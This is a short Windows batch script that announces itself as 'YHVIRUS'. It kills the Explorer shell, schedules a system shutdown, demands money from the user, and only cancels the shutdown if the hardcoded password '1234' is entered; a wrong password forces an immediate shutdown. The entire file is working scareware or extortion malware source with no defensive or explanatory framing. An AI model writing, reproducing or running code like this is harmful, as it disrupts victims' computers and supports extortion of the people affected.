@echo off
cls

color 17
taskkill /f /im explorer.exe
cls
echo YHVIRUS
echo YOU HACKED BY YHVIRUS

shutdown -s -t 100
echo SPEND SOME MONEY TO ME
set /p password=PASSWORD:
if %password%==1234 goto case2

: case1
cls
echo !WARNING! WRONG PASSWORD...!
shutdown -a
shutdown -s -t 1
exit

: case2
cls
echo !COLLECT!
shutdown -a
start C:\Windows\explorer.exe
pause
